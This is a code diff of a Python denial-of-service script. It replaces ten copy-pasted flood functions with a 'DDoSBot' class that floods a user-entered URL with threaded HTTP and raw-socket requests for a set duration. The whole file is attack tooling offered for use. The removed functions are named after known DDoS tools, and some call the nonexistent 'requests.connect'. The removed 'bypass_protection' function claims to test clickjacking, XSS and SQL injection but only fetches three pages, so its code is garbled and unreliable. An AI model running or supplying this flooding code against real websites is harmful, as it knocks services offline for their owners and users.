@@ -1,174 +1,62 @@
 import requests
 import threading
+import time
 import socket
-import os
-import sys
-from multiprocessing import Value
 
-stop_flag = Value('b', False)
+class DDoSBot:
+    def __init__(self, url, threads, duration):
+        self.url = url
+        self.threads = threads
+        self.duration = duration
+        self.is_active = True
+        self.headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
 
-def send_request(target):
-    while not stop_flag.value:
-        try:
-            requests.get(target, timeout=5)
-        except requests.exceptions.RequestException:
-            pass
+    def attack(self):
+        while self.is_active:
+            try:
+                requests.get(self.url, headers=self.headers, timeout=0.1)
+                requests.post(self.url, headers=self.headers, timeout=0.1)
+                requests.head(self.url, headers=self.headers, timeout=0.1)
+            except requests.exceptions.RequestException:
+                pass
 
-def http_flood(target_url):
-    while True:
-        try:
-            requests.get(target_url)
-            requests.post(target_url)
-            requests.head(target_url)
-            requests.put(target_url)
-            requests.delete(target_url)
-            requests.options(target_url)
-            requests.connect(target_url)
-            requests.patch(target_url)
-        except:
-            pass
+    def socket_attack(self):
+        while self.is_active:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((self.url.split('/')[2], 80))
+                s.send(b'GET / HTTP/1.1\r\nHost: ' + self.url.split('/')[2].encode() + b'\r\n\r\n')
+                s.close()
+            except socket.error:
+                pass
 
-def low_orbit_ion_cannon(target_url):
-    while True:
-        try:
-            requests.get(target_url)
-            requests.post(target_url)
-            requests.head(target_url)
-            requests.put(target_url)
-            requests.delete(target_url)
-            requests.options(target_url)
-            requests.connect(target_url)
-            requests.patch(target_url)
-        except:
-            pass
+    def start_attack(self):
+        threads = []
+        for _ in range(self.threads // 2):
+            thread = threading.Thread(target=self.attack)
+            thread.start()
+            threads.append(thread)
 
-def hping3(target_url):
-    while True:
-        try:
-            requests.get(target_url)
-            requests.post(target_url)
-            requests.head(target_url)
-            requests.put(target_url)
-            requests.delete(target_url)
-            requests.options(target_url)
-            requests.connect(target_url)
-            requests.patch(target_url)
-        except:
-            pass
+        for _ in range(self.threads // 2):
+            thread = threading.Thread(target=self.socket_attack)
+            thread.start()
+            threads.append(thread)
 
-def black_scope(target_url):
-    while True:
-        try:
-            requests.get(target_url)
-            requests.post(target_url)
-            requests.head(target_url)
-            requests.put(target_url)
-            requests.delete(target_url)
-            requests.options(target_url)
-            requests.connect(target_url)
-            requests.patch(target_url)
-        except:
-            pass
+        time.sleep(self.duration)
+        self.is_active = False
 
-def trinoo(target_url):
-    while True:
-        try:
-            requests.get(target_url)
-            requests.post(target_url)
-            requests.head(target_url)
-            requests.put(target_url)
-            requests.delete(target_url)
-            requests.options(target_url)
-            requests.connect(target_url)
-            requests.patch(target_url)
-        except:
-            pass
-
-def golden_eye(target_url):
-    while True:
-        try:
-            requests.get(target_url)
-            requests.post(target_url)
-            requests.head(target_url)
-            requests.put(target_url)
-            requests.delete(target_url)
-            requests.options(target_url)
-            requests.connect(target_url)
-            requests.patch(target_url)
-        except:
-            pass
-
-def shaft(target_url):
-    while True:
-        try:
-            requests.get(target_url)
-            requests.post(target_url)
-            requests.head(target_url)
-            requests.put(target_url)
-            requests.delete(target_url)
-            requests.options(target_url)
-            requests.connect(target_url)
-            requests.patch(target_url)
-        except:
-            pass
-
-def achilles(target_url):
-    while True:
-        try:
-            requests.get(target_url)
-            requests.post(target_url)
-            requests.head(target_url)
-            requests.put(target_url)
-            requests.delete(target_url)
-            requests.options(target_url)
-            requests.connect(target_url)
-            requests.patch(target_url)
-        except:
-            pass
-
-def socket_flood(target_url):
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target_url, 80))
-            s.send(b"GET / HTTP/1.1\r\nHost: " + target_url.encode() + b"\r\n\r\n")
-            s.close()
-        except:
-            pass
-
-def bypass_protection(target_url):
-    try:
-        # Clickjacking
-        clickjacking_url = target_url + "/clickjacking.html"
-        requests.get(clickjacking_url)
-
-        # XSS
-        xss_url = target_url + "/xss.php"
-        requests.get(xss_url)
-
-        # SQL Injection
-        sql_injection_url = target_url + "/sql_injection.php"
-        requests.get(sql_injection_url)
-    except:
-        pass
+        for thread in threads:
+            thread.join()
 
 def main():
-    target_url = input("Enter target URL: ")
-    num_threads = 1000
+    url = input("Enter the target URL: ")
+    threads = int(input("Enter the number of threads: "))
+    duration = int(input("Enter the attack duration (in seconds): "))
 
-    bypass_protection(target_url)
-
-    for i in range(num_threads):
-        threading.Thread(target=send_request, args=(target_url,)).start()
-        threading.Thread(target=http_flood, args=(target_url,)).start()
-        threading.Thread(target=low_orbit_ion_cannon, args=(target_url,)).start()
-        threading.Thread(target=hping3, args=(target_url,)).start()
-        threading.Thread(target=black_scope, args=(target_url,)).start()
-        threading.Thread(target=trinoo, args=(target_url,)).start()
-        threading.Thread(target=golden_eye, args=(target_url,)).start()
-        threading.Thread(target=shaft, args=(target_url,)).start()
-        threading.Thread(target=achilles, args=(target_url,)).start()
-        threading.Thread(target=socket_flood, args=(target_url,)).start()
+    bot = DDoSBot(url, threads, duration)
+    bot.start_attack()
 
 if __name__ == "__main__":
     main()
